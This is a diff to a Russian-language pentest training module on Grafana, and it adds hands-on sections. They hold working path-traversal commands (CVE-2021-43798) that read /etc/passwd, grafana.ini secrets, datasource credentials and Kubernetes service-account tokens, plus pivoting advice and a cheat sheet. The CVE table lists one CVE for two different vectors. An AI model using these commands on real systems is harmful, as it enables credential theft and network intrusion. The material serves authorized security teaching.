@@ -11,7 +11,7 @@ useful_for:
   - "CTF Web категория"
   - "Bug bounty"
   - "Пентест веб-приложений"
-estimated_minutes: 45
+estimated_minutes: 70
 summary: "Grafana как цель: определение версии, path traversal CVE-2021-43798 для чтения конфигов, SQLi→RCE CVE-2024-9264 и извлечение кред."
 ---
 
@@ -138,6 +138,72 @@ Grafana легко найти: порт 3000, узнаваемый интерф�
 ## Шаг 14: как оформить находку
 
 Укажи: точную версию и источник; применимый CVE; подтверждение (прочитанный файл с доказательством, но без выкладывания самих секретов в открытый отчёт); список систем, к которым получены доступы; рекомендации. Секреты в отчёте маскируй, но фиксируй факт доступа.
+
+## Практика: максимально используем Grafana-LFI
+
+CVE-2021-43798 даёт чтение файлов через любой включённый плагин. Список плагинов утекает из `/api/plugins`:
+
+```
+$ curl -s https://grafana.target.example/api/plugins | grep -oE '"id":"[^"]+"' | head
+"id":"alertlist"
+"id":"graphite"
+"id":"prometheus"
+```
+
+Теперь читаем конфиги по очереди. Самое ценное:
+
+```
+$ curl -s --path-as-is "https://grafana.target.example/public/plugins/alertlist/../../../../../../etc/grafana/grafana.ini" | grep -iE 'admin|secret|password'
+admin_user = admin
+admin_password = SuperSecret1
+secret_key = xxxxxxxxxxxxxxxxxx
+```
+
+`admin_password` — вход в панель, `secret_key` — подпись токенов. Дальше читаем `/etc/grafana/provisioning/datasources/*.yaml` — там креды к Prometheus/InfluxDB/Elasticsearch. Это уже полноценный доступ к мониторингу всей инфраструктуры.
+
+## Практика: datasource как мост к другим системам
+
+Войдя в Grafana, первым делом смотри `/api/datasources`:
+
+```
+$ curl -s -H "Authorization: Bearer <grafana-token>" https://grafana.target.example/api/datasources | head -c 300
+[{"id":1,"name":"Prometheus","type":"prometheus","url":"http://prometheus:9090",...
+```
+
+Здесь видно: внутренние адреса, порты, креды (в `basicAuthUser`/`secureJsonData`). Обычно это Elasticsearch с логами (там токены в тексте логов), InfluxDB с метриками (там имена хостов), Loki. Grafana фактически даёт **обзор всей внутренней сети** — и это ценнее, чем RCE на одной машине.
+
+## Практика: CVE-2024-9264 — SQLi → RCE
+
+CVE-2024-9264 — SQL-инъекция в функции `csv` (SQL Expressions), позволяющая выполнять команды через DuckDB. Требует аутентификации (любой пользователь, включая viewer, если включена `sqlExpressions`). Проверка: отправить запрос с payload к `/api/ds/query` и посмотреть, выполнится ли файловая операция DuckDB. Как и всегда, сначала подтверди версию и что функция включена, потом — минимальный payload.
+
+## Таблица: Grafana-векторы
+
+| Вектор | CVE | Уязвимые версии | Условие |
+|---|---|---|---|
+| Path traversal (LFI) | CVE-2021-43798 | 8.0–8.3.0 | без аутентификации |
+| SQLi → RCE | CVE-2024-9264 | 11.0–11.2.1 | аутентификация |
+| XSS | CVE-2022-31107 | 8.x–9.x | OAuth-логин |
+| Account takeover | CVE-2022-31107 | 9.0–9.2.3 | браузер |
+
+## Как связать Grafana с облаком и Kubernetes
+
+Grafana часто стоит в Kubernetes и имеет доступ к кластеру. В datasources может быть Prometheus, скрейпящий kubelet (`:10250`), и Loki. Через `/api/datasources` видно адреса kube-apiserver (`:6443`) и kubelet. Если у Grafana есть service-account с правами, её токен лежит в `/var/run/secrets/kubernetes.io/serviceaccount/token` — читается через тот же LFI. Тогда компромисс Grafana = доступ к Kubernetes API, а это уже контейнеры и секреты кластера. Все адреса и токены фиксируй: это карта для следующего этапа.
+
+## Шпаргалка: команды для Grafana
+
+Быстрый чек-лист. Версия: `curl -s https://host/api/health` (в теле `"version"`). Плагины: `curl -s https://host/api/plugins | grep -oE '"id":"[^"]+"'`. LFI (CVE-2021-43798): `curl -s --path-as-is "https://host/public/plugins/alertlist/../../../../../../etc/passwd"`. Конфиг: тот же приём с `/etc/grafana/grafana.ini`. Анонимный доступ: `curl -s https://host/api/org`. Datasources (с токеном): `curl -s -H 'Authorization: Bearer <t>' https://host/api/datasources`. Проверка SQL-функции для CVE-2024-9264: запрос к `/api/ds/query`. Каждую команду выполняй по одной и сохраняй результат — LFI подтверждается только выводом реального файла.
+
+## Почему панель мониторинга — недооценённая цель
+
+Grafana, Kibana и Prometheus считаются «вспомогательными» сервисами, и их часто ставят без пароля «на минутку», которая длится годами. Но панель видит **всё**: метрики всех хостов, логи всех приложений, адреса внутренних сервисов, а через datasources — доступ к базам и очередям. По сути это готовая карта инфраструктуры и точка pivot одновременно. Отсюда практический вывод: при внутреннем сканировании порт 3000/5601/9090 должен проверяться в первую очередь, а LFI в Grafana — считаться находкой высокого уровня, потому что за ней стоит вся сеть.
+
+## Короткий итог по Grafana
+
+Три ключа к Grafana: включённый плагин (для LFI), `grafana.ini` (для админа), datasources (для сети). Нашёл один — почти всегда найдёшь и два других. Держи эту цепочку в голове как единое целое.
+
+## Заметка про безопасность проверок
+
+При работе с Grafana помни: LFI — это чтение, а не запись. Не пытайся через traversal писать файлы (это уже другая уязвимость и другой уровень риска). Ограничься чтением конфигов и не трогай базы данных и dashboards продакшена. Так проверка остаётся неразрушающей, а находка — доказанной.
 
 ## Квиз
 
